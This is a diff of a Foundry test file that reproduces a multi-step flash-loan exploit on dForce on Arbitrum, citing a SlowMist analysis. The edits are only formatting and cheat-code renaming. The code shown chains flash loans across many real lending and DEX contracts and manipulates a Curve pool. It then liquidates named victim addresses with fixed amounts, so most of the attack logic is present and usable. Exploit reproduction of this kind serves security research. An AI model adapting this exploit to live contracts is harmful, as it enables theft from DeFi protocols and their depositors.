@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @Analysis
 // https://twitter.com/SlowMist_Team/status/1623956763598000129
@@ -31,10 +30,9 @@ interface IVWSTETHCRVGAUGE is IERC20 {
 
 interface ICurvePools is ICurvePool {
 
-    function remove_liquidity(
-        uint256 token_amount,
-        uint256[2] memory min_amounts
-    ) external returns (uint256[2] memory);
+    function remove_liquidity(uint256 token_amount, uint256[2] memory min_amounts)
+        external
+        returns (uint256[2] memory);
 
 }
 
@@ -70,10 +68,10 @@ contract ContractTest is Test {
     IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
     IAaveFlashloan Radiant = IAaveFlashloan(0x2032b9A8e9F7e76768CA9271003d3e43E1616B1F);
     uniswapV3Flash UniV3Flash = uniswapV3Flash(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443);
-    Uni_Pair_V2 SLP1 = Uni_Pair_V2(0xB7E50106A5bd3Cf21AF210A755F9C8740890A8c9);
-    Uni_Pair_V2 SLP2 = Uni_Pair_V2(0x905dfCD5649217c42684f23958568e533C711Aa3);
-    Uni_Pair_V2 SLP3 = Uni_Pair_V2(0x0C1Cf6883efA1B496B01f654E247B9b419873054);
-    Uni_Pair_V2 ZLP = Uni_Pair_V2(0x8b8149Dd385955DC1cE77a4bE7700CCD6a212e65);
+    IUniswapV2Pair SLP1 = IUniswapV2Pair(0xB7E50106A5bd3Cf21AF210A755F9C8740890A8c9);
+    IUniswapV2Pair SLP2 = IUniswapV2Pair(0x905dfCD5649217c42684f23958568e533C711Aa3);
+    IUniswapV2Pair SLP3 = IUniswapV2Pair(0x0C1Cf6883efA1B496B01f654E247B9b419873054);
+    IUniswapV2Pair ZLP = IUniswapV2Pair(0x8b8149Dd385955DC1cE77a4bE7700CCD6a212e65);
     ISwapFlashLoan swapFlashLoan = ISwapFlashLoan(0xa067668661C84476aFcDc6fA5D758C4c01C34352);
     ICurvePools curvePool = ICurvePools(0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80);
     ICointroller cointroller = ICointroller(0x61afB763bc265bD372e8Af8daC00196C9A5eCea0);
@@ -95,34 +93,32 @@ contract ContractTest is Test {
     uint256 swapFlashloanAmount;
     uint256 nonce;
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("arbitrum", 59_527_633);
-        cheats.label(address(WETH), "WETH");
-        cheats.label(address(USDC), "USDC");
-        cheats.label(address(USX), "USX");
-        cheats.label(address(WSTETH), "WSTETH");
-        cheats.label(address(WSTETHCRV), "WSTETHCRV");
-        cheats.label(address(WSTETHCRVGAUGE), "WSTETHCRVGAUGE");
-        cheats.label(address(VWSTETHCRVGAUGE), "VWSTETHCRVGAUGE");
-        cheats.label(address(balancer), "balancer");
-        cheats.label(address(aaveV3), "aaveV3");
-        cheats.label(address(Radiant), "Radiant");
-        cheats.label(address(UniV3Flash), "UniV3Flash");
-        cheats.label(address(SLP1), "SLP1");
-        cheats.label(address(SLP2), "SLP2");
-        cheats.label(address(SLP3), "SLP3");
-        cheats.label(address(ZLP), "ZLP");
-        cheats.label(address(swapFlashLoan), "swapFlashLoan");
-        cheats.label(address(curvePool), "curvePool");
-        cheats.label(address(cointroller), "cointroller");
-        cheats.label(address(aArbWETH), "aArbWETH");
-        cheats.label(address(rWETH), "rWETH");
-        cheats.label(address(dForceContract), "dForceContract");
-        cheats.label(address(PriceOracle), "PriceOracle");
-        cheats.label(address(curveYSwap), "curveYSwap");
-        cheats.label(address(GMXVault), "GMXVault");
+        vm.createSelectFork("arbitrum", 59_527_633);
+        vm.label(address(WETH), "WETH");
+        vm.label(address(USDC), "USDC");
+        vm.label(address(USX), "USX");
+        vm.label(address(WSTETH), "WSTETH");
+        vm.label(address(WSTETHCRV), "WSTETHCRV");
+        vm.label(address(WSTETHCRVGAUGE), "WSTETHCRVGAUGE");
+        vm.label(address(VWSTETHCRVGAUGE), "VWSTETHCRVGAUGE");
+        vm.label(address(balancer), "balancer");
+        vm.label(address(aaveV3), "aaveV3");
+        vm.label(address(Radiant), "Radiant");
+        vm.label(address(UniV3Flash), "UniV3Flash");
+        vm.label(address(SLP1), "SLP1");
+        vm.label(address(SLP2), "SLP2");
+        vm.label(address(SLP3), "SLP3");
+        vm.label(address(ZLP), "ZLP");
+        vm.label(address(swapFlashLoan), "swapFlashLoan");
+        vm.label(address(curvePool), "curvePool");
+        vm.label(address(cointroller), "cointroller");
+        vm.label(address(aArbWETH), "aArbWETH");
+        vm.label(address(rWETH), "rWETH");
+        vm.label(address(dForceContract), "dForceContract");
+        vm.label(address(PriceOracle), "PriceOracle");
+        vm.label(address(curveYSwap), "curveYSwap");
+        vm.label(address(GMXVault), "GMXVault");
     }
 
     function testExploit() public {
@@ -223,7 +219,7 @@ contract ContractTest is Test {
 
     function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
         SLP1Flashloan();
-        WETH.transfer(address(UniV3Flash), UniV3FlashloanAmount * 1000 / 997 + 1000);
+        WETH.transfer(address(UniV3Flash), (UniV3FlashloanAmount * 1000) / 997 + 1000);
     }
     // 9.sushipair1Flashloan
 
@@ -251,13 +247,13 @@ contract ContractTest is Test {
     function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
         if (msg.sender == address(SLP1)) {
             SLP2Flashloan();
-            WETH.transfer(address(SLP1), SLP1FlashloanAmount * 1000 / 997 + 1000);
+            WETH.transfer(address(SLP1), (SLP1FlashloanAmount * 1000) / 997 + 1000);
         } else if (msg.sender == address(SLP2)) {
             SLP3Flashloan();
-            WETH.transfer(address(SLP2), SLP2FlashloanAmount * 1000 / 997 + 1000);
+            WETH.transfer(address(SLP2), (SLP2FlashloanAmount * 1000) / 997 + 1000);
         } else if (msg.sender == address(SLP3)) {
             ZyberFlashloan();
-            WETH.transfer(address(SLP3), SLP3FlashloanAmount * 1000 / 997 + 1000);
+            WETH.transfer(address(SLP3), (SLP3FlashloanAmount * 1000) / 997 + 1000);
         }
     }
     // 15. ZyberFlashloan
@@ -271,7 +267,7 @@ contract ContractTest is Test {
 
     function ZyberCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
         SwapFlashLoans();
-        WETH.transfer(address(ZLP), ZLPFlashloanAmount * 10_000 / 9975 + 1000);
+        WETH.transfer(address(ZLP), (ZLPFlashloanAmount * 10_000) / 9975 + 1000);
     }
     // 17. SwapFlashLoan
 
@@ -282,13 +278,10 @@ contract ContractTest is Test {
     }
     // 18. SwapFlashLoan callback
 
-    function executeOperation(
-        address pool,
-        address token,
-        uint256 amount,
-        uint256 fee,
-        bytes calldata params
-    ) external payable {
+    function executeOperation(address pool, address token, uint256 amount, uint256 fee, bytes calldata params)
+        external
+        payable
+    {
         uint256 ETHBalance = WETH.balanceOf(address(this));
         WETH.withdraw(ETHBalance);
         console.log("--------------------------------------------------");
@@ -336,7 +329,7 @@ contract ContractTest is Test {
                 VWSTETHCRVGAUGE.decimals()
             );
             cointroller.liquidateCalculateSeizeTokens(
-                address(dForceContract), address(VWSTETHCRVGAUGE), borrowAmount * Multiplier / 1e18
+                address(dForceContract), address(VWSTETHCRVGAUGE), (borrowAmount * Multiplier) / 1e18
             );
             dForceContract.liquidateBorrow(address(borrower), 560_525_526_525_080_924_601_515, address(VWSTETHCRVGAUGE));
             borrowAmount = dForceContract.borrowBalanceStored(victimAddress2);
@@ -347,7 +340,7 @@ contract ContractTest is Test {
             );
             console.log("--------------------------------------------------");
             cointroller.liquidateCalculateSeizeTokens(
-                address(dForceContract), address(VWSTETHCRVGAUGE), borrowAmount * Multiplier / 1e18
+                address(dForceContract), address(VWSTETHCRVGAUGE), (borrowAmount * Multiplier) / 1e18
             );
             dForceContract.liquidateBorrow(victimAddress2, 300_037_034_111_437_845_493_368, address(VWSTETHCRVGAUGE));
             VWSTETHCRVGAUGE.redeem(address(this), VWSTETHCRVGAUGE.balanceOf(address(this)));
